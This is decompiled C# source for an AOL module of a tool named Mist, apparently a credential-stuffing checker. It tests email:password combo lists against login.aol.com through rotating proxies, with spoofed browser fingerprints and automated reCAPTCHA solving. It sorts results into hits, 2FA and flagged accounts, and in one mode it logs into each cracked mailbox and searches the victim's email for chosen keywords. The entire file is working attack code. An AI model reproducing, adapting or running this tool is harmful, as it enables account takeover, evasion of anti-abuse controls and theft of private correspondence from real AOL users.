

// Mist, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// Mist.Core.Modules.Aol
using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text.RegularExpressions;
using System.Threading;
using Jint;
using Leaf.xNet;
using Mist.Core;
using Mist.Core.FileManager;

public class Aol
{
	public static void UpdateTitle()
	{
		Console.Title = Context.toolName + " | " + Context.moduleName + " | File: " + Path.GetFileNameWithoutExtension(Context.comboName) + " | Hits: " + Stats.hitCnt + " | Custom: " + Stats.customCnt + " | 2FA: " + Stats.twofaCnt + " | Flagged: " + Stats.flaggedCnt + " | Fake: " + Stats.fakeCnt + " | Invalid: " + Stats.invalidCnt + " | Checked: " + Stats.checkedCnt + " | Remaining: " + Context.combo.Count + " | Retries: " + Stats.retryCnt + " | Errors: " + Stats.errorCnt + " | CPM: " + Stats.cpm2;
	}

	public static void DoWork()
	{
		//IL_00e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f0: Expected O, but got Unknown
		//IL_0198: Unknown result type (might be due to invalid IL or missing references)
		//IL_1501: Unknown result type (might be due to invalid IL or missing references)
		//IL_1508: Expected O, but got Unknown
		while (Context.combo.Count != 0)
		{
			int num = 0;
			string text = Context.combo.Take();
			string text2 = null;
			string text3 = null;
			if (text.Contains(":"))
			{
				text2 = text.Split(':')[0];
				text3 = text.Split(':')[1];
				if (string.IsNullOrEmpty(text3) || string.IsNullOrEmpty(text2) || text3.Length < 8)
				{
					Stats.Invalid();
					if (!string.IsNullOrEmpty(text))
					{
						Export.SaveProgress(text);
					}
					continue;
				}
				while (true)
				{
					UpdateTitle();
					HttpRequest val = new HttpRequest();
					try
					{
						SystemSslProvider obj2 = val.SslProvider<SystemSslProvider>();
						obj2.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(obj2.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
						val.IgnoreProtocolErrors = true;
						val.ConnectTimeout = 5000;
						val.KeepAliveTimeout = 5000;
						val.ReadWriteTimeout = 5000;
						CookieStorage cookies = new CookieStorage(false, (CookieContainer)null);
						val.Cookies = cookies;
						string text4 = null;
						if (Context.proxies.Count != 0)
						{
							text4 = Context.proxies.ElementAt(Context.rnd.Next(Context.proxies.Count));
							val.Proxy = LoadProxyType(text4);
							val.Proxy.ConnectTimeout = 5000;
							val.Proxy.AbsoluteUriInStartingLine = false;
							val.Proxy.ReadWriteTimeout = 5000;
						}
						if (Context.proxies.Count == 0 && !string.IsNullOrEmpty(Context.settings.ProxyUrl))
						{
							Thread.Sleep(5000);
							continue;
						}
						string userAgent = Http.RandomUserAgent();
						Engine val2 = new Engine().Execute("function ret(source) { return encodeURIComponent(source); }");
						val.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
						val.AddHeader("Accept-Encoding", "text");
						val.AddHeader("Accept-Language", "en-us");
						val.AddHeader("Connection", "keep-alive");
						val.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36");
						val.AddHeader("referer", "https://www.google.com/");
						val.UserAgent = userAgent;
						HttpResponse val3 = val.Get("https://login.aol.com/", (RequestParams)null);
						string input = ((object)val3).ToString();
						string text5 = Functions.LR(input, "name=\"crumb\" value=\"", "\"").FirstOrDefault();
						string text6 = Functions.LR(input, "name=\"acrumb\" value=\"", "\"").FirstOrDefault();
						string text7 = Functions.LR(input, "sessionIndex\" value=\"", "\"").FirstOrDefault();
						if (!string.IsNullOrEmpty(text6) && !string.IsNullOrEmpty(text7))
						{
							val.UserAgent = userAgent;
							val.AddHeader("X-Requested-With", "XMLHttpRequest");
							val.AddHeader("content-type", "application/x-www-form-urlencoded; charset=UTF-8");
							val.AddHeader("Accept", "*/*");
							val.AddHeader("Sec-GPC", "1");
							val.AddHeader("Origin", "https://login.aol.com/");
							val.AddHeader("Sec-Fetch-Site", "same-origin");
							val.AddHeader("Sec-Fetch-Mode", "cors");
							val.AddHeader("Sec-Fetch-Dest", "empty");
							val.AddHeader("Referer", "https://login.aol.com//");
							val.AddHeader("Accept-Encoding", "gzip, deflate, br");
							val.AddHeader("Accept-Language", "en-US,en;q=0.9");
							val.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36");
							string text8 = ((object)val.Post(val3.Address.ToString(), "browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A16%2C%22timezoneOffset%22%3A-120%2C%22timezone%22%3A%22Europe%2FMalta%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A4%2C%22hash%22%3A%229f7e572b15cd17b8949fe198d125c062%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.%20(Google)~ANGLE%20(Google%2C%20Vulkan%201.2.0%20(SwiftShader%20Device%20(Subzero)%20(0x0000C0DE))%2C%20SwiftShader%20driver-5.0.0)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22123.3844654374916%22%2C%22resolution%22%3A%7B%22w%22%3A%221920%22%2C%22h%22%3A%221080%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%221040%22%2C%22h%22%3A%221920%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1631810240207%2C%22render%22%3A1631810259317%7D%7D&crumb=" + ((object)val2.Invoke("ret", new object[1] { text5 }))?.ToString() + "&acrumb=" + text6 + "&sessionIndex=" + text7 + "&displayName=&deviceCapability=%7B%22pa%22%3A%7B%22status%22%3Afalse%7D%7D&username=" + ((object)val2.Invoke("ret", new object[1] { text2 }))?.ToString() + "&passwd=&signin=Next", "application/x-www-form-urlencoded; charset=UTF-8")).ToString();
							string text9 = Functions.LR(text8, "{\"location\":\"", "\"}").FirstOrDefault();
							while (true)
							{
								if (!text8.Contains("INVALID_USERNAME") && !text8.Contains("Sorry, we don't recognize this\u00a0account."))
								{
									if (!text8.Contains("/account/challenge/push") && !text8.Contains("/account/challenge/yak-code") && !text8.Contains("/account/challenge/web-authn") && !text8.Contains("/account/challenge/challenge-selector") && !text8.Contains("/account/challenge/fail") && !text8.Contains("/account/challenge/phone-verify?") && !text8.Contains("account/challenge/phone-obfuscation") && !text8.Contains("/account/challenge/email-verify") && !text8.Contains("https://login.yahoo.com/saml2") && !text8.Contains("/account/challenge/tsv-authenticator") && !text8.Contains("/account/challenge/web-authn") && !text8.Contains("/account/challenge/email-obfuscation"))
									{
										if (text8.Contains("/account/challenge/recaptcha?"))
										{
											if (Context.settings.Module == 4)
											{
												if (num != 3)
												{
													num++;
													Stats.Retry();
													break;
												}
												Stats.Flagged();
												Export.SaveData(text, "flaggeds");
												goto end_IL_14fc;
											}
											if (Context.settings.Module == 5 || Context.settings.Module == 6)
											{
												string text10 = SolveCaptcha.TwoCaptcha(new Captcha
												{
													SiteKey = "6LcbmroaAAAAANQ34XOxul9o_UgaJ6dkdq62Xey6",
													SiteUrl = "https://login.yahoo.net"
												});
												if (!string.IsNullOrEmpty(text10))
												{
													val.AllowAutoRedirect = false;
													val.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36");
													val.AddHeader("Cache-Control", "max-age=0");
													val.AddHeader("Upgrade-Insecure-Requests", "1");
													val.AddHeader("Origin", "https://login.aol.com/");
													val.AddHeader("Content-Type", "application/x-www-form-urlencoded");
													val.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
													val.AddHeader("Sec-GPC", "1");
													val.AddHeader("Sec-Fetch-Site", "same-origin");
													val.AddHeader("Sec-Fetch-Mode", "navigate");
													val.AddHeader("Sec-Fetch-User", "?1");
													val.AddHeader("Sec-Fetch-Dest", "document");
													val.AddHeader("Referer", "https://login.yahoo.net");
													val.AddHeader("Accept-Encoding", "gzip, deflate, br");
													val.AddHeader("Accept-Language", "en-US,en;q=0.9");
													text8 = ((object)val.Post("https://login.aol.com/" + text9, "crumb=" + ((object)val2.Invoke("ret", new object[1] { text5 }))?.ToString() + "&acrumb=" + text6 + "&sessionIndex=" + text7 + "&displayName=&context=primary&g-recaptcha-response=" + text10, "application/x-www-form-urlencoded")).ToString();
													continue;
												}
												Stats.Retry();
												break;
											}
										}
										else
										{
											if (!text8.Contains("/account/challenge/password"))
											{
												if (string.IsNullOrEmpty(text8))
												{
													Stats.Retry();
													break;
												}
												Stats.Invalid();
												Stats.Error();
												Export.SaveData(text + "~|~|~" + text8, "res1_errors");
												goto end_IL_14fc;
											}
											val.AllowAutoRedirect = false;
											val.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36");
											val.AddHeader("Cache-Control", "max-age=0");
											val.AddHeader("Upgrade-Insecure-Requests", "1");
											val.AddHeader("Origin", "https://login.aol.com/");
											val.AddHeader("Content-Type", "application/x-www-form-urlencoded");
											val.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
											val.AddHeader("Sec-GPC", "1");
											val.AddHeader("Sec-Fetch-Site", "same-origin");
											val.AddHeader("Sec-Fetch-Mode", "navigate");
											val.AddHeader("Sec-Fetch-User", "?1");
											val.AddHeader("Sec-Fetch-Dest", "document");
											val.AddHeader("Referer", "https://login.aol.com//account/challenge/password?done=https%3A%2F%2Fwww.yahoo.com%2F&sessionIndex=" + text7 + "&acrumb=" + text6 + "&display=login&authMechanism=primary");
											val.AddHeader("Accept-Encoding", "gzip, deflate, br");
											val.AddHeader("Accept-Language", "en-US,en;q=0.9");
											HttpResponse val4 = val.Post("https://login.aol.com//account/challenge/password?done=https%3A%2F%2Fwww.yahoo.com%2F&sessionIndex=" + text7 + "&acrumb=" + text6 + "&display=login&authMechanism=primary", "browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A16%2C%22timezoneOffset%22%3A-120%2C%22timezone%22%3A%22Europe%2FMalta%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A4%2C%22hash%22%3A%229f7e572b15cd17b8949fe198d125c062%22%7D%2C%22canvas%22%3A%22canvas+winding%3Ayes%7Ecanvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google+Inc.+%28Google%29%7EANGLE+%28Google%2C+Vulkan+1.2.0+%28SwiftShader+Device+%28Subzero%29+%280x0000C0DE%29%29%2C+SwiftShader+driver-5.0.0%29%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22123.3844654374916%22%2C%22resolution%22%3A%7B%22w%22%3A%221920%22%2C%22h%22%3A%221080%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%221040%22%2C%22h%22%3A%221920%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1631810246667%2C%22render%22%3A1631810265236%7D%7D&crumb=" + ((object)val2.Invoke("ret", new object[1] { text5 }))?.ToString() + "&acrumb=" + text6 + "&sessionIndex=" + text7 + "&displayName=" + ((object)val2.Invoke("ret", new object[1] { text2 }))?.ToString() + "&username=" + ((object)val2.Invoke("ret", new object[1] { text2 }))?.ToString() + "&passwordContext=normal&password=" + ((object)val2.Invoke("ret", new object[1] { text3 }))?.ToString() + "&verifyPassword=Next", "application/x-www-form-urlencoded");
											string text11 = ((object)val4).ToString();
											if (!text11.Contains("/account/challenge/password?") && !text11.Contains("/account/challenge/fail?") && !text11.Contains("/account/challenge/recaptcha?"))
											{
												if (!text11.Contains("https://login.aol.com/account/update") && !text11.Contains("https://login.aol.com/account/change-password/"))
												{
													if (!text11.Contains("Redirecting to <a href=\"https://guce.aol.com/consent") && !text11.Contains("https://login.aol.com/account/fb-messenger") && !text11.Contains("https://membernotifications.aol.com/notice/login") && !text11.Contains("https://login.aol.com/account/comm-channel/refresh") && !text11.Contains("account/review/account-health-check?"))
													{
														if (text11.Contains("/account/challenge/tsv-authenticator"))
														{
															Stats.TwoFa();
															Export.SaveData(text, "2FA");
														}
														else
														{
															if (!text11.Contains("/account/challenge/challenge-selector"))
															{
																Stats.Invalid();
																Stats.Error();
																Export.SaveData(text + "~|~|~" + text11, "res2_errors");
																goto end_IL_14fc;
															}
															val.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
															val.AddHeader("Accept-Encoding", "text");
															val.AddHeader("Accept-Language", "en-US,en;q=0.9");
															val.AddHeader("Cache-Control", "max-age=0");
															val.AddHeader("Connection", "keep-alive");
															val.AddHeader("Origin", "https://login.aol.com/");
															val.AddHeader("Referer", "https://login.aol.com//");
															val.AddHeader("Sec-Fetch-Mode", "navigate");
															val.AddHeader("Sec-Fetch-Site", "same-origin");
															val.AddHeader("Sec-Fetch-User", "?1");
															val.AddHeader("Upgrade-Insecure-Requests", "1");
															val.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36");
															string text12 = ((object)val.Get("https://login.aol.com" + val4["Location"], (RequestParams)null)).ToString();
															if (text12.Contains("For your safety, choose a method below to verify that it&#x27;s really you signing in to this\u00a0account"))
															{
																if (Context.settings.Module == 6)
																{
																	Stats.Custom();
																	Export.SaveData(text, "customs");
																}
																else
																{
																	Stats.Valid();
																	Export.SaveData(text, "80_percent_hits");
																}
															}
															else
															{
																if (!text12.Contains("We want to make sure that it&#x27;s really you using this account") && !text12.Contains("We haven&#x27;t seen you sign in from this device before.") && !text12.Contains("object Object") && !text12.Contains("to sign in to your\u00a0account"))
																{
																	Stats.Invalid();
																	Stats.Error();
																	Export.SaveData(text + "~|~|~" + text12, "res3_errors");
																	goto end_IL_14fc;
																}
																Stats.TwoFa();
																Export.SaveData(text, "2FA");
															}
														}
													}
													else
													{
														Stats.Valid();
														Export.SaveData(text, "hits");
														if (Context.settings.Module == 6)
														{
															while (true)
															{
																try
																{
																	val.AllowAutoRedirect = true;
																	val.MaximumAutomaticRedirections = 20;
																	val.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36");
																	val.AddHeader("Cache-Control", "max-age=0");
																	val.AddHeader("Upgrade-Insecure-Requests", "1");
																	val.AddHeader("Origin", "https://login.aol.com/");
																	val.AddHeader("Content-Type", "application/x-www-form-urlencoded");
																	val.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
																	val.AddHeader("Sec-GPC", "1");
																	val.AddHeader("Sec-Fetch-Site", "same-origin");
																	val.AddHeader("Sec-Fetch-Mode", "navigate");
																	val.AddHeader("Sec-Fetch-User", "?1");
																	val.AddHeader("Sec-Fetch-Dest", "document");
																	val.AddHeader("Referer", "https://login.aol.com//account/challenge/password?done=https%3A%2F%2Fwww.yahoo.com%2F&sessionIndex=" + text7 + "&acrumb=" + text6 + "&display=login&authMechanism=primary");
																	val.AddHeader("Accept-Encoding", "gzip, deflate, br");
																	val.AddHeader("Accept-Language", "en-US,en;q=0.9");
																	((object)val.Get(val4.Location, (RequestParams)null)).ToString();
																	string text13 = Functions.LR(val.Cookies.GetCookieHeader("https://oidc.www.aol.com"), "OTHP=", ";").FirstOrDefault();
																	val.Cookies.Set("OTHP", text13, "mail.aol.com", "/");
																	val.AllowAutoRedirect = false;
																	val.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36");
																	val.AddHeader("Accept", "*/*");
																	val.AddHeader("Sec-GPC", "1");
																	val.AddHeader("Sec-Fetch-Site", "same-origin");
																	val.AddHeader("Sec-Fetch-Mode", "cors");
																	val.AddHeader("Sec-Fetch-Dest", "empty");
																	val.AddHeader("Referer", "https://mail.aol.com/webmail-std/en-us/suite");
																	val.AddHeader("Accept-Encoding", "gzip, deflate, br");
																	val.AddHeader("Accept-Language", "en-US,en;q=0.9");
																	string text14 = Functions.Json(((object)val.Get("https://mail.aol.com/ws/v3/mailboxes?appid=aolwebmail", (RequestParams)null)).ToString(), "wssid").FirstOrDefault();
																	val.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36");
																	val.AddHeader("Accept", "*/*");
																	val.AddHeader("Sec-GPC", "1");
																	val.AddHeader("Sec-Fetch-Site", "same-origin");
																	val.AddHeader("Sec-Fetch-Mode", "cors");
																	val.AddHeader("Sec-Fetch-Dest", "empty");
																	val.AddHeader("Referer", "https://mail.aol.com/webmail-std/en-us/suite");
																	val.AddHeader("Accept-Encoding", "gzip, deflate, br");
																	val.AddHeader("Accept-Language", "en-US,en;q=0.9");
																	string input2 = ((object)val.PostJson("https://www.aol.com/ws/v3/batch?appid=aolportal&wssid=" + text14, "{\"responseType\":\"json\",\"requests\":[{\"id\":\"GetMailboxId\",\"uri\":\"/ws/v3/mailboxes/\",\"method\":\"GET\",\"filters\":{\"select\":{\"mailboxId\":\"$..mailboxes[?(@.isPrimary==true)].id\"}},\"requests\":[{\"id\":\"GetAccounts\",\"uri\":\"/ws/v3/mailboxes/@.id==$(mailboxId)/accounts\",\"method\":\"GET\",\"filters\":{\"select\":{\"accountId\":\"$..accounts[?(@.isPrimary==true)].id\"}},\"requests\":[{\"id\":\"GetFolders\",\"uri\":\"/ws/v3/mailboxes/@.id==$(mailboxId)/folders\",\"method\":\"GET\",\"filters\":{\"select\":{\"folderId\":\"$..folders[?(@.acctId=='$(accountId)' && 'INBOX' in @.types)].id\"}}}]}]}]}")).ToString();
																	string value = Regex.Match(input2, "\"types\":\\[\"INBOX\"\\],\"unread\":(.*?),\"total\":(.*?),\"").Groups[2].Value;
																	string value2 = Regex.Match(input2, "\"types\":\\[\"TRASH\"\\],\"unread\":(.*?),\"total\":(.*?),\"").Groups[2].Value;
																	string text15 = Functions.LR(input2, ".id==", "\"").FirstOrDefault();
																	string[] array = Context.settings.SearchKeyword.Split(',');
																	foreach (string text16 in array)
																	{
																		val.AddHeader("X-Requested-With", "XMLHttpRequest");
																		val.AddHeader("Content-Type", "application/json");
																		val.AddHeader("Accept", "*/*");
																		val.AddHeader("Sec-GPC", "1");
																		val.AddHeader("Origin", "https://mail.aol.com");
																		val.AddHeader("Sec-Fetch-Site", "same-origin");
																		val.AddHeader("Sec-Fetch-Mode", "cors");
																		val.AddHeader("Sec-Fetch-Dest", "empty");
																		val.AddHeader("Referer", "https://mail.aol.com/webmail-std/en-us/suite");
																		val.AddHeader("Accept-Encoding", "gzip, deflate, br");
																		val.AddHeader("Accept-Language", "en-US,en;q=0.9");
																		val.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36");
																		val.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36");
																		string text17 = Functions.Json(((object)val.PostJson("https://mail.aol.com/ws/v3/batch?appid=aolwebmail&webstdver=105.0&wssid=" + text14, "{\"responseType\":\"json\",\"requests\":[{\"id\":\"ListFolders\",\"uri\":\"/ws/v3/mailboxes/@.id==" + text15 + "/folders\",\"method\":\"GET\"},{\"id\":\"ListMessages1\",\"uri\":\"/ws/v3/mailboxes/@.id==" + text15 + "/messages/@.select==q?&q=(%20highlight%3Aoff%20userQuery%3A%22" + ((object)val2.Invoke("ret", new object[1] { text16 }))?.ToString() + "%22%20)%20offset%3A100%20count%3A100%20sort%3A(-date)\",\"method\":\"GET\"}]}")).ToString(), "totalMatches").FirstOrDefault();
																		string line = text + " | Emails containing keyword " + text16 + ": [" + text17 + "] | Inbox: " + value + " | Trash: " + value2;
																		if (!string.IsNullOrEmpty(text17) && Convert.ToInt32(text17) != 0)
																		{
																			Export.SaveData(line, "emails_containing_" + text16.Replace("from:", ""));
																		}
																	}
																	Export.SaveData(text + " | Inbox: " + value + " | Trash: " + value2, "size_of_inbox");
																}
																catch (Exception ex)
																{
																	Export.SaveData(text + "~|~|~" + ex.Message, "exceptions_from_inbox_scan");
																	if (!ex.Message.Contains("Failed to receive the response") && !ex.Message.Contains("Unable to connect to the HTTP-server"))
																	{
																		break;
																	}
																	Stats.Retry();
																	continue;
																}
																break;
															}
														}
													}
												}
												else
												{
													Stats.Valid();
													Export.SaveData(text, "needs_pw_reset_hits");
												}
											}
											else
											{
												Stats.Invalid();
												Export.SaveData(text, "invalid_passwords");
											}
										}
									}
									else
									{
										Stats.Invalid();
									}
								}
								else
								{
									Stats.Fake();
									Export.SaveData(text, "fakes");
								}
								Export.SaveProgress(text);
								goto end_IL_14fc;
							}
						}
						else
						{
							Stats.Retry();
						}
					}
					catch (HttpException)
					{
						Stats.Error();
					}
					catch (FormatException ex2)
					{
						Export.SaveData("Type: " + ex2.GetType().FullName + ", Message: " + ex2.Message + ", Stack: " + ex2.StackTrace, "FormatException");
						Stats.Error();
					}
					catch (NullReferenceException ex3)
					{
						Export.SaveData("Type: " + ex3.GetType().FullName + ", Message: " + ex3.Message + ", Stack: " + ex3.StackTrace, "NullReferenceException");
						Stats.Error();
					}
					catch (OverflowException ex4)
					{
						Export.SaveData("Type: " + ex4.GetType().FullName + ", Message: " + ex4.Message + ", Stack: " + ex4.StackTrace, "OverflowException");
						Stats.Error();
					}
					catch (Exception ex5)
					{
						Export.SaveData("Type: " + ex5.GetType().FullName + ", Message: " + ex5.Message + ", Stack: " + ex5.StackTrace, "Exception");
						Stats.Error();
					}
					finally
					{
						val.Dispose();
					}
					continue;
					end_IL_14fc:
					break;
				}
			}
			else
			{
				Stats.Invalid();
				if (!string.IsNullOrEmpty(text))
				{
					Export.SaveProgress(text);
				}
			}
		}
		UpdateTitle();
	}

	public static ProxyClient LoadProxyType(string proxy)
	{
		return (ProxyClient)(Context.settings.ProxyType switch
		{
			0 => HttpProxyClient.Parse(proxy), 
			1 => Socks4ProxyClient.Parse(proxy), 
			2 => Socks5ProxyClient.Parse(proxy), 
			_ => null, 
		});
	}
}
